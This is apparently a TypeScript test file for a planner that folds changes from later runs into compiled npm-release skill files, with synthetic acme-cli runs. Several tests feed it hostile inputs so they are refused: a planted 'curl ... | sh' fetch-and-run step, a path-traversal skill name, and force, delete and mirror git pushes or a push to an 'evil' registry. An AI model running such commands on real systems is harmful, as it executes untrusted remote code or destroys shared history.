/**
 * The fold plan (phase 2 design 4.2, 4.3, 4.4, P4 to P11): one change per
 * offer, new step text only from a fresh compile of the run, no new param,
 * no new step that can't be undone, the result checked and size-gated.
 * Pure. Synthetic runs of a made-up acme-cli release.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { applyFold, driftDiff, foldDiff, planFold, replaceWith, type FoldInput } from "../src/skills/fold.js";
import { sameGatedCommand } from "../src/skills/fold-gated.js";
import { fidelityOf, extraKey } from "../src/skills/fidelity.js";
import { compileRun, type CompileOpts } from "../src/skills/compile.js";
import { parseSkillMd, renderSkillMd } from "../src/skills/skillmd.js";
import { rebuildLoose } from "../src/skills/skill-rebuild.js";
import { sizeGate } from "../src/skills/skill-diff.js";
import { releaseSkill } from "./skills-recall-fixtures.js";
import type { CompiledSkill } from "../src/skills/types.js";
import type { Lesson } from "../src/skills/lessons.js";
import type { RunCall } from "../src/trace/types.js";
import { HOME, KEY, ROOT, call, failed, injectionFor, passed, sheet } from "./skills-fold-fixtures.js";

const OPTS: CompileOpts = { repoRoot: ROOT, home: HOME, platform: "darwin", moment: "repeated", applies: KEY, taken: () => false };

const PUSH = "git push git@github.com:acme/cli.git HEAD:dev";
/** One release run: the calls before the check, then `npm view` showing the version. */
function releaseCalls(version: string, opts: { skip?: number[]; extraAfter?: Record<number, RunCall[]>; replace?: Record<number, RunCall[]> } = {}): RunCall[] {
  const steps = ["git pull --ff-only origin main", "npm run build", `npm version ${version} --no-git-tag-version`, PUSH, "npm publish --access public"];
  const out: RunCall[] = [];
  steps.forEach((s, k) => {
    const n = k + 1;
    if (opts.replace?.[n]) out.push(...opts.replace[n]!);
    else if (!opts.skip?.includes(n)) out.push(call(s));
    out.push(...(opts.extraAfter?.[n] ?? []));
  });
  out.push(call("npm view acme-cli version", { tail: version, check: passed("npm-view", { version, pkg: "acme-cli" }) }));
  return out;
}
function compiled(calls: RunCall[], version: string, o: Partial<CompileOpts> = {}): CompiledSkill {
  const r = compileRun(sheet(calls, { checkIndex: calls.length - 1, checked: true, promptParams: { version } }), { ...OPTS, ...o });
  if (!r.ok) assert.fail(`refused ${r.reason}: ${r.detail}`);
  return r.skill;
}

const BASE = compiled(releaseCalls("0.22.3"), "0.22.3");
const TEXT = renderSkillMd(BASE);
const PARSED = parseSkillMd(TEXT, BASE.name)!;

/** The fold input for one checked use of the skill. */
function use(calls: RunCall[], version: string, o: Partial<FoldInput> = {}, base: CompiledSkill = BASE): FoldInput {
  const text = renderSkillMd(base);
  const skill = parseSkillMd(text, base.name)!;
  const inj = injectionFor(base, { version });
  const r = compileRun(sheet(calls, { checkIndex: calls.length - 1, checked: true, promptParams: { version } }), { ...OPTS, name: base.name, id: base.meta.trail });
  return {
    skill, text, fresh: r.ok ? r.skill : null, fid: fidelityOf(skill, inj, calls), inj,
    earlierExtraShas: [], lessons: [], earlierRan: [], ...o,
  };
}
const lesson = (text: string, kind: Lesson["kind"] = "lesson"): Lesson => ({ id: "ls-1a2b3c", skill: BASE.meta.trail, at: "2026-10-20", text, kind, src: "correction", wall: null });

test("the base skill is what compile writes, five steps, publish gated", () => {
  assert.deepEqual(BASE.steps.map((s) => s.cmd), ["git pull --ff-only origin main", "npm run build", "npm version {version} --no-git-tag-version", PUSH, "npm publish --access public"]);
  assert.equal(BASE.steps[4]!.gated, "publish");
});

test("nothing changed: no-change", () => {
  assert.deepEqual(planFold(use(releaseCalls("0.22.4"), "0.22.4")), { op: "none", why: "no-change" });
});

test("update: step 4 failed and another git push worked; the plan swaps step 4 for it", () => {
  const other = "git push origin HEAD:dev";
  const i = use(releaseCalls("0.22.4", { replace: { 4: [failed(PUSH), call(other)] } }), "0.22.4");
  const p = planFold(i);
  assert.equal(p.op, "update");
  if (p.op !== "update") return;
  assert.equal(p.step, 4);
  assert.equal(p.cmd.cmd, other);
  assert.equal(p.cmd.n, 4);
  assert.ok(p.cmd.from?.length, "the tool_use ids it was copied from stay, for the update gate's re-read");
  const next = applyFold(i.base ?? BASE, p)!;
  assert.equal(next.meta.version, "2");
  assert.equal(next.steps[3]!.cmd, other);
});

test("update wins over extend", () => {
  const i = use(releaseCalls("0.22.4", { replace: { 4: [failed(PUSH), call("git push origin HEAD:dev")] }, extraAfter: { 4: [call("node scripts/stamp-cli.mjs 0.22.4")] } }), "0.22.4",
    { lessons: [lesson("stamp the build too: node scripts/stamp-cli.mjs {version}")] });
  assert.equal(planFold(i).op, "update");
});

test("extend from a lesson: 'stamp the build too: node scripts/stamp-cli.mjs {version}' and a run that stamped 0.22.4", () => {
  const i = use(releaseCalls("0.22.4", { extraAfter: { 4: [call("node scripts/stamp-cli.mjs 0.22.4")] } }), "0.22.4", { lessons: [lesson("stamp the build too: node scripts/stamp-cli.mjs {version}")] });
  const p = planFold(i);
  assert.deepEqual(p.op === "extend" && { at: p.at, cmds: p.cmds.map((s) => s.cmd), why: p.why, lessonIds: p.lessonIds },
    { at: 4, cmds: ["node scripts/stamp-cli.mjs {version}"], why: "lesson", lessonIds: ["ls-1a2b3c"] });
  const next = applyFold(BASE, p as Extract<typeof p, { op: "extend" }>)!;
  assert.deepEqual(next.steps.map((s) => s.n), [1, 2, 3, 4, 5, 6]);
  assert.equal(next.steps[4]!.cmd, "node scripts/stamp-cli.mjs {version}");
  assert.equal(next.meta.needs, `${BASE.meta.needs}, node`);
  assert.equal(next.steps[5]!.cmd, "npm publish --access public");
});

test("extend from two uses: the same extra step in the use before, keyed by extraKey of its source call", () => {
  const stamp = (v: string) => call(`node scripts/stamp-cli.mjs ${v}`);
  const before = extraKey(stamp("0.22.3"), { version: "0.22.3" });
  const calls = releaseCalls("0.22.4", { extraAfter: { 4: [stamp("0.22.4")] } });
  assert.deepEqual(planFold(use(calls, "0.22.4")), { op: "none", why: "no-change" }, "one use is weak evidence (P5)");
  const p = planFold(use(calls, "0.22.4", { earlierExtraShas: [[before]] }));
  assert.equal(p.op, "extend");
  if (p.op !== "extend") return;
  assert.equal(p.why, "two-uses");
  assert.equal(p.at, 4);
  assert.deepEqual(p.cmds.map((s) => s.cmd), ["node scripts/stamp-cli.mjs {version}"]);
  assert.deepEqual(p.lessonIds, []);
  // Only the use right before counts.
  assert.equal(planFold(use(calls, "0.22.4", { earlierExtraShas: [[before], []] })).op, "none");
});

test("a guardrail lesson is never folded", () => {
  const i = use(releaseCalls("0.22.4", { extraAfter: { 4: [call("node scripts/stamp-cli.mjs 0.22.4")] } }), "0.22.4", { lessons: [lesson("don't skip the stamp: node scripts/stamp-cli.mjs {version}", "guardrail")] });
  assert.deepEqual(planFold(i), { op: "none", why: "guardrail-lesson" });
});

test("review: a lesson's step must be one this use ran and passed: never a call with no result, never one from before the block", () => {
  const L = { lessons: [lesson("stamp the build too: node scripts/stamp-cli.mjs {version}")] };
  const open = call("node scripts/stamp-cli.mjs 0.22.4", { src: { use: 99_000, result: null } });
  const i = use(releaseCalls("0.22.4", { extraAfter: { 4: [open] } }), "0.22.4", L);
  assert.ok(i.fresh?.steps.some((s) => s.cmd === "node scripts/stamp-cli.mjs {version}"), "compile keeps it: the fold must not");
  assert.deepEqual(planFold(i), { op: "none", why: "no-change" });
  // A stamp that ran an hour before the block came in is not this use's step.
  const early = call("node scripts/stamp-cli.mjs 0.22.4", { at: "2026-10-27T09:00:00.000Z" });
  const calls = [early, ...releaseCalls("0.22.4")];
  const j = use(calls, "0.22.4", L);
  const inj = injectionFor(BASE, { version: "0.22.4" }, { at: "2026-10-27T10:30:00.000Z" });
  assert.deepEqual(planFold({ ...j, inj, fid: fidelityOf(j.skill, inj, calls) }), { op: "none", why: "no-change" });
});

test("review: an update's fallback by program and verb takes only a call that passed in this use", () => {
  const open = call("git push origin HEAD:dev", { src: { use: 99_000, result: null } });
  const i = use(releaseCalls("0.22.4", { replace: { 4: [failed(PUSH), open] } }), "0.22.4");
  assert.deepEqual(i.fid.changed, []);
  // Even with a changed fact naming another call, the candidate with no result is not the change.
  const p = planFold({ ...i, fid: { ...i.fid, changed: [{ step: 4, callIx: 0, id: "toolu_none" }] } });
  assert.deepEqual(p, { op: "none", why: "no-change" });
});

test("review: an If it fails line names its step at its end; a quoted error saying 'what worked was step 1.' doesn't take the renumber", () => {
  const fixture = releaseSkill({}, { ifFails: ['`npm publish` said "x: what worked was step 1.": what worked was step 5.'] });
  const next = applyFold(fixture, { op: "extend", at: 2, cmds: [{ n: 3, cmd: "node scripts/stamp-cli.mjs {version}", gated: null, bg: false, wait: false }], why: "two-uses", lessonIds: [] })!;
  assert.equal(next.ifFails[0], '`npm publish` said "x: what worked was step 1.": what worked was step 6.');
});

test("review: a split's own name is always a good, free name, never one taken or made from a hand-edited name", () => {
  const edited = TEXT.replace("name: release-npm", "name: ../../Evil Name");
  const skill = parseSkillMd(edited, "release-npm")!;
  const calls = releaseCalls("0.22.4", { skip: [1, 5] });
  const i = { ...use(calls, "0.22.4", { earlierRan: [[2, 3, 4]], earlierExtraShas: [[]], earlierChecks: ["passed"] }), text: edited, skill, base: rebuildLoose(edited, skill) };
  const p = planFold(i);
  assert.ok(p.op !== "split" || /^[a-z0-9][a-z0-9-]{1,47}$/.test(p.name), JSON.stringify(p));
  const taken = new Set(["release-npm-2", "release-npm-3"]);
  const q = planFold({ ...use(calls, "0.22.4", { earlierRan: [[2, 3, 4]], earlierExtraShas: [[]], earlierChecks: ["passed"] }), taken: (n: string) => taken.has(n) });
  assert.equal(q.op === "split" && q.name, "release-npm-4");
});

test("the tag push a lesson names is refused: compile marks 'git push origin v{version}' as a push that can't be undone (P7)", () => {
  const i = use(releaseCalls("0.22.4", { extraAfter: { 4: [call("git push origin v0.22.4")] } }), "0.22.4", { lessons: [lesson("push the tag too: git push origin v{version}")] });
  assert.equal(i.fresh?.steps.find((s) => s.cmd === "git push origin v{version}")?.gated, "push-prod");
  assert.deepEqual(planFold(i), { op: "none", why: "gated-new" });
});

test("a candidate that needs a param the skill doesn't have is refused", () => {
  const pr = call("gh pr ready 123");
  const calls = releaseCalls("0.22.4", { extraAfter: { 4: [pr] } });
  const i = use(calls, "0.22.4", { earlierExtraShas: [[extraKey(call("gh pr ready 123"), { version: "0.22.4" })]] });
  assert.ok(i.fresh?.params.some((p) => p.name === "pr"), "compile made it a param");
  assert.deepEqual(planFold(i), { op: "none", why: "new-param" });
});

test("an update whose new step needs a param the skill doesn't have is refused", () => {
  const i = use(releaseCalls("0.22.4", { replace: { 4: [failed(PUSH), call("git push origin 4e1c9a2f:refs/heads/dev")] } }), "0.22.4");
  assert.ok(i.fresh?.params.some((p) => p.name === "sha"));
  assert.deepEqual(planFold(i), { op: "none", why: "new-param" });
});

test("a gated replacement for an ungated step is refused (P7)", () => {
  const i = use(releaseCalls("0.22.4", { replace: { 2: [failed("npm run build"), call("npm run deploy")] } }), "0.22.4");
  assert.deepEqual(planFold(i), { op: "none", why: "gated-new" });
});

test("a gated extra step is never added (P7)", () => {
  const dep = call("npm run deploy");
  const i = use(releaseCalls("0.22.4", { extraAfter: { 4: [dep] } }), "0.22.4", { earlierExtraShas: [[extraKey(call("npm run deploy"), {})]] });
  assert.deepEqual(planFold(i), { op: "none", why: "gated-new" });
});

test("three extras give at most 2 steps", () => {
  const ex = ["node scripts/a.mjs", "node scripts/b.mjs", "node scripts/c.mjs"];
  const calls = releaseCalls("0.22.4", { extraAfter: { 4: ex.map((c) => call(c)) } });
  const i = use(calls, "0.22.4", { earlierExtraShas: [ex.map((c) => extraKey(call(c), {}))] });
  const p = planFold(i);
  assert.equal(p.op, "extend");
  if (p.op === "extend") assert.deepEqual(p.cmds.map((s) => s.cmd), ["node scripts/a.mjs", "node scripts/b.mjs"]);
});

test("split: this use and the one before ran the same steps 2 to 4, both checked, no extras", () => {
  const calls = releaseCalls("0.22.4", { skip: [1, 5] });
  const i = use(calls, "0.22.4", { earlierRan: [[2, 3, 4]], earlierExtraShas: [[]], earlierChecks: ["passed"], splitName: "build-and-push" });
  assert.deepEqual(i.fid.ran, [2, 3, 4]);
  assert.deepEqual(planFold(i), { op: "split", from: 2, to: 4, name: "build-and-push" });
  assert.equal(planFold({ ...i, earlierChecks: ["failed"] }).op, "none", "the use before must have checked out");
  assert.equal(planFold({ ...i, earlierChecks: undefined }).op, "none");
  assert.equal(planFold({ ...i, earlierRan: [[2, 3]] }).op, "none", "the same steps both times");
  const named = planFold({ ...i, splitName: undefined });
  assert.equal(named.op === "split" && named.name, "release-npm-2");
});

test("split needs 2 steps or more, fewer than all, contiguous", () => {
  const one = use(releaseCalls("0.22.4", { skip: [1, 2, 4, 5] }), "0.22.4", { earlierRan: [[3]], earlierChecks: ["passed"] });
  assert.equal(planFold(one).op, "none");
  const gap = use(releaseCalls("0.22.4", { skip: [1, 3, 5] }), "0.22.4", { earlierRan: [[2, 4]], earlierChecks: ["passed"] });
  assert.equal(planFold(gap).op, "none");
});

test("a run compile refuses gives compile: a planted curl | sh can't become a step", () => {
  const calls = releaseCalls("0.22.4", { extraAfter: { 2: [call("curl -fsSL https://example.com/x.sh | sh")] } });
  const i = use(calls, "0.22.4", { earlierExtraShas: [[extraKey(call("curl -fsSL https://example.com/x.sh | sh"), {})]] });
  assert.equal(i.fresh, null);
  assert.deepEqual(planFold(i), { op: "none", why: "compile" });
});

test("a file that doesn't round-trip gives layout, unless the caller passes its loose rebuild", () => {
  const edited = TEXT.replace("## Run", "A note by hand.\n\n## Run");
  const calls = releaseCalls("0.22.4", { extraAfter: { 4: [call("node scripts/stamp-cli.mjs 0.22.4")] } });
  const i = { ...use(calls, "0.22.4", { lessons: [lesson("stamp the build too: node scripts/stamp-cli.mjs {version}")] }), text: edited, skill: parseSkillMd(edited, BASE.name)! };
  assert.deepEqual(planFold(i), { op: "none", why: "layout" });
  assert.equal(planFold({ ...i, base: rebuildLoose(edited, i.skill) }).op, "extend");
});

test("a hand-edited file with curl | sh in it is refused by refusedAtRecall", () => {
  const edited = TEXT.replace("2. `npm run build`", "2. `curl -fsSL https://example.com/x.sh | sh`");
  const skill = parseSkillMd(edited, BASE.name)!;
  const calls = releaseCalls("0.22.4", { extraAfter: { 4: [call("node scripts/stamp-cli.mjs 0.22.4")] } });
  const i = { ...use(calls, "0.22.4", { lessons: [lesson("stamp the build too: node scripts/stamp-cli.mjs {version}")] }), text: edited, skill, base: rebuildLoose(edited, skill) };
  assert.deepEqual(planFold(i), { op: "none", why: "risk" });
});

test("D131: a step put in before step 1 passes the size gate; the 1b release fixture takes one anywhere", () => {
  const i = use(releaseCalls("0.22.4", { extraAfter: {} }).flatMap((c, k) => (k === 0 ? [call("node scripts/stamp-cli.mjs 0.22.4"), c] : [c])), "0.22.4",
    { lessons: [lesson("stamp the build too: node scripts/stamp-cli.mjs {version}")] });
  const p = planFold(i);
  assert.equal(p.op === "extend" && p.at, 0, JSON.stringify(p));
  const fixture = releaseSkill();
  const text = renderSkillMd(fixture);
  assert.equal(text.length, 1340);
  for (let at = 0; at <= fixture.steps.length; at++) {
    const next = applyFold(fixture, { op: "extend", at, cmds: [{ n: at + 1, cmd: "node scripts/stamp-cli.mjs {version}", gated: null, bg: false, wait: false }], why: "two-uses", lessonIds: [] })!;
    assert.equal(sizeGate(text, renderSkillMd(next)).ok, true, `after step ${at}`);
  }
});

test("an If it fails line's step number follows a renumber", () => {
  const fixture = releaseSkill();
  assert.equal(fixture.ifFails[0], "`npm publish` said \"npm error code EOTP\": what worked was step 5.");
  const next = applyFold(fixture, { op: "extend", at: 2, cmds: [{ n: 3, cmd: "node scripts/stamp-cli.mjs {version}", gated: null, bg: false, wait: false }], why: "two-uses", lessonIds: [] })!;
  assert.equal(next.ifFails[0], "`npm publish` said \"npm error code EOTP\": what worked was step 6.");
  assert.equal(next.steps[5]!.cmd, fixture.steps[4]!.cmd, "step 6 is still the publish that worked");
  assert.equal(next.ifFails[1], fixture.ifFails[1], "a line with no step in it is kept as it is");
  const late = applyFold(fixture, { op: "extend", at: 6, cmds: [{ n: 7, cmd: "node scripts/stamp-cli.mjs {version}", gated: null, bg: false, wait: false }], why: "two-uses", lessonIds: [] })!;
  assert.equal(late.ifFails[0], fixture.ifFails[0]);
});

test("13 Run lines are refused", () => {
  const twelve: CompiledSkill = { ...BASE, steps: Array.from({ length: 12 }, (_, k) => ({ n: k + 1, cmd: `npm run task${k + 1}`, gated: null, bg: false, wait: false })), meta: { ...BASE.meta, "confirm-before": undefined } };
  assert.equal(applyFold(twelve, { op: "extend", at: 12, cmds: [{ n: 13, cmd: "npm run more", gated: null, bg: false, wait: false }], why: "two-uses", lessonIds: [] }), null);
  assert.ok(applyFold({ ...twelve, steps: twelve.steps.slice(0, 11) }, { op: "extend", at: 11, cmds: [{ n: 12, cmd: "npm run more", gated: null, bg: false, wait: false }], why: "two-uses", lessonIds: [] }));
});

test("a step over 300 characters is refused, and so is a gated step without its mark", () => {
  const long = `node scripts/x.mjs ${"a".repeat(300)}`;
  assert.equal(applyFold(BASE, { op: "update", step: 2, cmd: { n: 2, cmd: long, gated: null, bg: false, wait: false }, why: "failed-then-worked" }), null);
  assert.equal(applyFold(BASE, { op: "update", step: 2, cmd: { n: 2, cmd: "npm publish --tag beta", gated: null, bg: false, wait: false }, why: "failed-then-worked" }), null);
});

test("confirm-before, needs and the check line's step number follow a renumber", () => {
  const tests: CompiledSkill = {
    ...BASE, check: "npm test", checkShows: "ok", checkIsStep: true,
    meta: { ...BASE.meta, job: "tests", check: "npm test", "check-shows": "ok", needs: "npm", "confirm-before": "npm publish --access public" },
    steps: [
      { n: 1, cmd: "npm ci", gated: null, bg: false, wait: false },
      { n: 2, cmd: "npm publish --access public", gated: "publish", bg: false, wait: false },
      { n: 3, cmd: "npm test", gated: null, bg: false, wait: false },
    ],
  };
  const before = renderSkillMd(tests);
  assert.ok(before.includes("Step 3, `npm test`, is the check"));
  const next = applyFold(tests, { op: "extend", at: 1, cmds: [{ n: 2, cmd: "pnpm install --frozen-lockfile", gated: null, bg: false, wait: false }], why: "two-uses", lessonIds: [] })!;
  const text = renderSkillMd(next);
  assert.ok(text.includes("Step 4, `npm test`, is the check"), text);
  assert.equal(next.meta["confirm-before"], "npm publish --access public");
  assert.equal(next.meta.needs, "npm, pnpm");
  assert.deepEqual(next.steps.map((s) => s.n), [1, 2, 3, 4]);
  assert.equal(next.meta.version, "2");
  // An update that takes the only pnpm step away takes pnpm out of needs.
  const back = applyFold(next, { op: "update", step: 2, cmd: { n: 2, cmd: "npm install", gated: null, bg: false, wait: false }, why: "failed-then-worked" })!;
  assert.equal(back.meta.needs, "npm");
  assert.equal(back.meta.version, "3");
});

test("the size gate refuses a fold of a small file that would change over 40% of it", () => {
  const check = (v: string) => call("npm view acme-cli version", { tail: v, check: passed("npm-view", { version: v, pkg: "acme-cli" }) });
  const small = compiled([call("npm version 0.22.3 --no-git-tag-version"), check("0.22.3")], "0.22.3");
  const text = renderSkillMd(small);
  const skill = parseSkillMd(text, small.name)!;
  const big = `node scripts/stamp-cli.mjs 0.22.4 ${"--with-a-long-flag ".repeat(12)}`.trim();
  const calls = [call("npm version 0.22.4 --no-git-tag-version"), call(big), check("0.22.4")];
  const i = use(calls, "0.22.4", { earlierExtraShas: [[extraKey(call(big), { version: "0.22.4" })]] }, small);
  assert.ok(i.fresh, "compiles");
  assert.ok(big.length < 300 && text.length < 1000, `${big.length} and ${text.length}`);
  assert.deepEqual(planFold(i), { op: "none", why: "too-big" });
});

test("replaceWith keeps the id, name, scope, applies, job and asks, takes the rest from the run, and bumps the version", () => {
  const fresh = compiled(releaseCalls("0.22.4", { skip: [4] }), "0.22.4", { name: "release-npm-other", id: "s-000000" });
  const base = { ...BASE, meta: { ...BASE.meta, asks: "ship the cli, cut a release", "status-asks": "is it out", version: "3" } };
  const next = replaceWith(base, fresh);
  assert.equal(next.name, BASE.name);
  assert.deepEqual([next.meta.trail, next.meta.scope, next.meta.applies, next.meta.job, next.meta.asks, next.meta["status-asks"], next.meta.version],
    [BASE.meta.trail, "personal", KEY, "release", "ship the cli, cut a release", "is it out", "4"]);
  assert.deepEqual(next.steps.map((s) => s.cmd), fresh.steps.map((s) => s.cmd));
  const d = driftDiff(base, fresh);
  assert.equal(d.op, "replace");
  assert.equal(d.text, renderSkillMd(next));
  assert.ok(d.diff.includes(`-4. \`${PUSH}\``), d.diff);
});

test("foldDiff: none gives the input text; a fold gives the new text and its diff; a split prints a new file", () => {
  const same = use(releaseCalls("0.22.4"), "0.22.4");
  assert.deepEqual(foldDiff(same, BASE), { text: TEXT, diff: "", op: "none", why: "no-change" });
  const ext = use(releaseCalls("0.22.4", { extraAfter: { 4: [call("node scripts/stamp-cli.mjs 0.22.4")] } }), "0.22.4", { lessons: [lesson("stamp the build too: node scripts/stamp-cli.mjs {version}")] });
  const d = foldDiff(ext, BASE);
  assert.equal(d.op, "extend");
  assert.ok(d.text.includes("5. `node scripts/stamp-cli.mjs {version}`"));
  assert.ok(d.diff.startsWith("--- release-npm/SKILL.md v1\n+++ release-npm/SKILL.md v2\n"), d.diff);
  assert.ok(d.diff.includes('+  version: "2"'));
  const split = use(releaseCalls("0.22.4", { skip: [1, 5] }), "0.22.4", { earlierRan: [[2, 3, 4]], earlierChecks: ["passed"], splitName: "build-and-push" });
  const s = foldDiff(split, BASE);
  assert.equal(s.op, "split");
  assert.ok(s.diff.startsWith("--- /dev/null\n+++ build-and-push/SKILL.md v1\n@@ -0,0 +1,"), s.diff);
  const sp = parseSkillMd(s.text, "build-and-push")!;
  assert.equal(sp.name, "build-and-push");
  assert.notEqual(sp.meta.trail, BASE.meta.trail, "the split has an id of its own");
});

test("planFold never throws", () => {
  assert.deepEqual(planFold({} as FoldInput), { op: "none", why: "compile" });
  assert.equal(planFold({ ...use(releaseCalls("0.22.4"), "0.22.4"), fid: null as never }).op, "none");
  assert.ok(PARSED.steps.length === 5);
});

/* D138 (1): a fold's changed gated step is the same command with only its params changed. */

const PUBLISH = "npm publish --access public";
test("D138 (1): sameGatedCommand keeps a gated step's command; a force or skip flag it lacked, a + refspec or a new shared branch refuses", () => {
  assert.equal(sameGatedCommand(PUBLISH, `${PUBLISH} --tag next`), true, "an argument changed");
  for (const next of [`${PUBLISH} --force`, "npm publish -fq --access public", `${PUBLISH} --no-verify`, "npm run deploy", `${PUBLISH} && npm dist-tag add acme-cli@1 latest`]) {
    assert.equal(sameGatedCommand(PUBLISH, next), false, next);
  }
  assert.equal(sameGatedCommand("git push origin v0.22.3", "git push origin HEAD:main"), false, "retargeted to main");
  assert.equal(sameGatedCommand("git push origin v0.22.3", "git push origin +v0.22.3"), false, "a + refspec forces");
  assert.equal(sameGatedCommand("git push --force origin HEAD:main", "git push --force origin refs/heads/main"), true, "the old step had both");
  assert.equal(sameGatedCommand("git push origin v0.22.3", "git push origin v0.22.4"), true, "only the version changed");
});

test("D138 (1), D148: no remote or registry change, and no delete, mirror or every-ref push the old step lacked", () => {
  const TAG = "git push origin v0.22.3";
  for (const next of [
    "git push upstream v0.22.3", "git push git@github.com:acme/cli.git v0.22.4", "git push https://git.example.com/acme/cli.git v0.22.3",
    "git push origin :v0.22.3", "git push origin --delete v0.22.3", "git push -d origin v0.22.3", "git push origin --mirror",
    "git push --all origin", "git push origin v0.22.3 --prune", "git push origin --tags",
  ]) assert.equal(sameGatedCommand(TAG, next), false, next);
  assert.equal(sameGatedCommand("docker push registry.acme.dev/shop:1.2", "docker push registry.evil.dev/shop:1.3"), false, "another registry");
  assert.equal(sameGatedCommand("docker push registry.acme.dev/shop:1.2", "docker push registry.acme.dev/shop:1.3"), true, "a new tag, same registry");
  assert.equal(sameGatedCommand("git push --delete origin v0.0.1-rc", "git push --delete origin v0.0.2-rc"), true, "the old step deleted too");
});

test("D138 (1): a gated step that failed and then worked with a force flag is never folded in", () => {
  const force = use(releaseCalls("0.22.4", { replace: { 5: [failed(PUBLISH), call(`${PUBLISH} --force`)] } }), "0.22.4");
  const p = planFold(force);
  assert.ok(!(p.op === "update" && p.cmd.cmd.includes("--force")), JSON.stringify(p));
});

test("D138 (1): a gated push that a fold would retarget to a protected branch is refused, though both are push-prod", () => {
  const tagPush = (v: string) => call(`git push origin v${v}`);
  const base = compiled(releaseCalls("0.22.3", { replace: { 4: [tagPush("0.22.3")] } }), "0.22.3");
  assert.equal(base.steps[3]!.cmd, "git push origin v{version}");
  assert.equal(base.steps[3]!.gated, "push-prod");
  const i = use(releaseCalls("0.22.4", { replace: { 4: [failed("git push origin v0.22.4"), call("git push origin HEAD:main")] } }), "0.22.4", {}, base);
  assert.equal(i.fresh?.steps.find((s) => s.cmd === "git push origin HEAD:main")?.gated, "push-prod", "the same gated kind (the hole P7 left)");
  assert.deepEqual(planFold(i), { op: "none", why: "gated-new" });
});
